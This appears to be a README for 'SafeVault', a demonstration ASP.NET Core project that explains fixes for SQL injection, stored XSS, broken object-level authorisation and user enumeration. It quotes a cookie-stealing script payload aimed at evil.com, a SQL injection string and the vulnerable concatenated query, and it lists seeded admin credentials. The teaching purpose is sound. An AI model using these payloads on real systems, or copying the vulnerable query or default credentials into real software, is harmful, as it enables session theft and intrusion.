# SafeVault – Secure C# .NET Application

A demonstration project for security best practices built with **ASP.NET Core 8** and **Entity Framework Core**.

---

## Project Structure

```
SafeVault/
├── SafeVault/                  # Main API project
│   ├── Controllers/
│   │   ├── AuthController.cs   # Register & Login endpoints
│   │   ├── VaultController.cs  # CRUD vault items (RBAC-protected)
│   │   └── AdminController.cs  # Admin-only user management
│   ├── Data/
│   │   └── AppDbContext.cs     # EF Core context (parameterised queries)
│   ├── DTOs/
│   │   └── Dtos.cs             # Request/Response objects with DataAnnotations
│   ├── Middleware/
│   │   └── AntiXssMiddleware.cs # Request-level XSS blocking + security headers
│   ├── Models/
│   │   ├── User.cs             # User entity with UserRole enum
│   │   └── VaultItem.cs        # Protected data entity
│   ├── Services/
│   │   ├── AuthService.cs      # Registration, login, role management
│   │   ├── InputValidationService.cs  # Whitelist validation + HTML sanitisation
│   │   ├── TokenService.cs     # JWT generation & validation
│   │   └── VaultService.cs     # Vault CRUD with RBAC + XSS sanitisation
│   ├── appsettings.json
│   └── Program.cs              # App bootstrap (JWT, RBAC policies, middleware)
│
└── SafeVault.Tests/            # xUnit test project
    ├── InputValidationTests.cs # 20 tests – validation + XSS + SQL injection
    ├── AuthServiceTests.cs     # 8 tests  – registration, login, RBAC roles
    └── VaultServiceTests.cs    # 7 tests  – RBAC ownership, XSS sanitisation
```

---

## How to Run

### Prerequisites
- [.NET 8 SDK](https://dotnet.microsoft.com/download)

### Run the API
```bash
cd SafeVault/SafeVault
dotnet run
# Open https://localhost:5001/swagger to explore the API
```

### Default Admin Credentials (seeded)
| Field    | Value          |
|----------|----------------|
| Username | `admin`        |
| Password | `Admin@12345`  |
| Role     | Admin          |

### Run the Tests
```bash
cd SafeVault
dotnet test --verbosity normal
```

---

## Activity 1 – Input Validation & SQL Injection Prevention

### Vulnerability Identified
The original application concatenated user input directly into SQL strings:
```csharp
// VULNERABLE (before fix)
var sql = $"SELECT * FROM Users WHERE Username = '{username}'";
```
A username like `' OR '1'='1` would return all users.

### Fix Applied
Two complementary defences were implemented:

1. **EF Core parameterised queries** — all database access uses LINQ/EF Core, which compiles to `WHERE Username = @p0` internally. User input never touches raw SQL.
   ```csharp
   // SAFE – EF Core parameterises automatically
   var user = await _db.Users
       .FirstOrDefaultAsync(u => u.Username == request.Username);
   ```

2. **Whitelist input validation** — `InputValidationService` uses strict regex patterns before data reaches the database layer.
   ```csharp
   private static readonly Regex UsernameRegex =
       new(@"^[a-zA-Z0-9_\-\.]{3,50}$", RegexOptions.Compiled);
   ```

3. **DataAnnotations** on all DTOs enforce validation at the controller boundary before anything reaches the service layer.

### How Copilot Assisted
Copilot generated the initial regex patterns for username, email, and password validation, and suggested using `AnyAsync` with lambda predicates instead of raw SQL to ensure parameterisation.

---

## Activity 2 – Authentication & Authorization (RBAC)

### Implementation

**Authentication — JWT tokens:**
- On successful login, `TokenService.GenerateToken()` issues a signed HS256 JWT.
- The token embeds `ClaimTypes.Role` (`Viewer`, `Editor`, `Admin`).
- Token expiry is configurable (default 8 hours). `ClockSkew = TimeSpan.Zero` prevents tolerance windows.

**Authorisation — Role-Based Access Control:**

| Role   | Permissions                                      |
|--------|--------------------------------------------------|
| Viewer | Read own vault items                             |
| Editor | Read + create/edit own vault items               |
| Admin  | Full access: all items, user list, role changes  |

```csharp
// Controller-level RBAC
[Authorize(Roles = "Admin")]            // Admin-only controller
[Authorize(Roles = "Editor,Admin")]     // Editor or Admin endpoint
[Authorize]                             // Any authenticated user
```

**Password security:**
- BCrypt with work factor 12 — resistant to brute-force even if the DB is stolen.
- Constant-time comparison via `BCrypt.Verify` prevents timing attacks.
- Generic "Invalid credentials" response prevents user enumeration.

### How Copilot Assisted
Copilot scaffolded the JWT configuration in `Program.cs`, suggested `ClockSkew = TimeSpan.Zero` to tighten token validation, and generated the `[Authorize(Roles = ...)]` attribute patterns.

---

## Activity 3 – Debugging & Resolving Security Vulnerabilities

### Vulnerability 1: Stored XSS
**Problem:** Vault item content was stored and returned without sanitisation. An attacker could store `<script>document.location='https://evil.com?c='+document.cookie</script>` and steal session cookies.

**Fix:**
- `InputValidationService.SanitizeHtml()` uses the **HtmlSanitizer** library to strip dangerous tags/attributes, allowing only safe HTML (`<b>`, `<i>`, `<p>`, `<br>`).
- `AntiXssMiddleware` scans every JSON request body for script patterns and returns HTTP 400 before the controller is reached.
- Security response headers (`Content-Security-Policy`, `X-XSS-Protection`, `X-Frame-Options`) are added to every response.

### Vulnerability 2: SQL Injection (see Activity 1 above)

### Vulnerability 3: Broken Object-Level Authorisation (BOLA / IDOR)
**Problem:** A Viewer could request `/api/vault/42` and read another user's item if they guessed the ID.

**Fix:** `VaultService` checks ownership on every read/delete:
```csharp
if (requestingRole != UserRole.Admin && item.OwnerId != requestingUserId)
    return null;   // Returns 404 — no information leakage
```

### Vulnerability 4: User Enumeration
**Problem:** Separate "user not found" vs "wrong password" messages allowed attackers to enumerate valid usernames.

**Fix:** Both failure cases return the identical message: `"Invalid credentials."`.

### How Copilot Assisted
Copilot identified that the original login logic had separate error branches and suggested merging them into a single generic response. It also recommended `HtmlSanitizer` over manual regex for XSS sanitisation, and generated the `AntiXssMiddleware` skeleton.

---

## Tests Summary

| Test Class              | Count | What is tested                                   |
|-------------------------|-------|--------------------------------------------------|
| `InputValidationTests`  | 20    | Username/email/password rules, XSS, SQL patterns |
| `AuthServiceTests`      | 8     | Registration, login, password hashing, RBAC      |
| `VaultServiceTests`     | 7     | XSS strip, RBAC ownership, delete guard          |
| **Total**               | **35**|                                                  |

Run with: `dotnet test --verbosity normal`

---

## Security Headers Added
| Header                  | Value                            | Purpose                  |
|-------------------------|----------------------------------|--------------------------|
| X-Content-Type-Options  | nosniff                          | Prevent MIME sniffing    |
| X-Frame-Options         | DENY                             | Prevent clickjacking     |
| X-XSS-Protection        | 1; mode=block                    | Legacy XSS filter        |
| Referrer-Policy         | strict-origin-when-cross-origin  | Limit referrer leakage   |
| Content-Security-Policy | default-src 'self'               | Restrict resource origins|
